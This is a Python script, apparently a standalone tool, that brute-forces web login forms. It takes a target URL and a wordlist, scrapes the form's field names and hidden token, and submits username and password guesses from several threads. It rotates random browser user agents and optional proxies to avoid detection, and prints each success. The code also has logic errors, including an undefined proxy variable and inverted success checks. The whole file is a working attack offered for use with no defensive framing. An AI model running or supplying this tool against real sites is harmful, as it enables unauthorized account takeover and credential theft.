import requests as req
import colorama
import bs4
import threading
import fake_useragent.fake
import random
from colorama import Fore

colorama.init()

useragents = fake_useragent.fake.load(['chrome','brave','edge','firefox','opera'])
useproxy = input('Do you want to use proxy ? [y/n] > ')
threadnum = input('Enter thread number [Default : 10] > ')
wordlistloc = input('Enter wordlist location > ')
successmsg = input('Enter success message > ')
wrongmsg = input('Enter fail message > ')
target = input('Target login URL [with http://] > ')
user = input('Do you want to use a default username [if empty uses wordlist as username list] > ')

if useproxy.lower().startswith('y'):
    temp = open('proxies.txt','r').readlines()
    proxies = [proxy.replace('\n','') for proxy in temp]

temp = open(wordlistloc,'r').readlines()
wordlist = [word.replace('\n','') for word in temp]

def login(fail,success,username,password):
    global useproxy
    header = {
        'user-agent': random.choice(useragents)
    }
    if useproxy.lower().startswith('y'):
        temproxy = {
            'http': random.choice(proxies),
            'https': random.choice(proxies)
        }
        res = req.get(target,proxies=temproxy,headers=header)
    else:
        res = req.get(target,headers=header)    
    soup = bs4.BeautifulSoup(res.content,features='lxml')
    form = soup.find('form')
    userinput = soup.find('input',attrs={"type":'text'})
    passwdinput = soup.find('input',attrs={"type":'password'})
    token = soup.find('input',attrs={"type":'hidden'})

    if not token:
        data = {
            userinput.get('name'): username,
            passwdinput.get('name'): password
        }
    else:
        data = {
            userinput.get('name'): username,
            passwdinput.get('name'): password,
            token.get('name'): token.get('value')
        }
    if form.get('method').lower() == 'get':
        if not form.get('action') == '' or not form.get('action'):
            if temproxy:
                res = req.get(target,headers=header,params=data,proxies=temproxy)
            else:
                res = req.get(target,headers=header,params=data)
            
            if res.text in success:
                return True
            elif res.text in fail:
                return False
            else:
                return False
        else:
            if temproxy:
                res = req.get(form.get('action'),headers=header,params=data,proxies=temproxy)
            else:
                res = req.get(form.get('action'),headers=header,params=data)
            
            if res.text in success:
                return True
            elif res.text in fail:
                return False
            else:
                return False
            
    if form.get('method').lower() == 'post':
        if not form.get('action') == '' or not form.get('action'):
            if temproxy:
                res = req.post(target,headers=header,json=data,proxies=temproxy)
            else:
                res = req.post(target,headers=header,json=data)
            
            if res.text in success:
                return True
            elif res.text in fail:
                return False
            else:
                return False
        else:
            if temproxy:
                res = req.post(form.get('action'),headers=header,json=data,proxies=temproxy)
            else:
                res = req.post(form.get('action'),headers=header,json=data)
            
            if res.text in success:
                return True
            elif res.text in fail:
                return False
            else:
                return False

def loop():
    for word in wordlist:
        try:
            if user == '':
                res = login(fail=wrongmsg,success=successmsg,username=word,password=word)
            else:
                res = login(fail=wrongmsg,success=successmsg,username=user,password=word)
            if not res:
                if user == '':
                    print(f'{Fore.RED}[Wrong]{Fore.RESET}\n     Username : {word}\n    Password : {word}')
                else:
                    print(f'{Fore.RED}[Wrong]{Fore.RESET}\n     Username : {user}\n    Password : {word}')
            elif res:
                if user == '':
                    print(f'{Fore.GREEN}[Success]{Fore.RESET}\n     Username : {word}\n    Password : {word}')
                else:
                    print(f'{Fore.GREEN}[Success]{Fore.RESET}\n     Username : {user}\n    Password : {word}')
        except KeyboardInterrupt:
            print('Exiting...')
            exit()

for _ in range(int(threadnum)):
    t = threading.Thread(target=loop)
    t.start()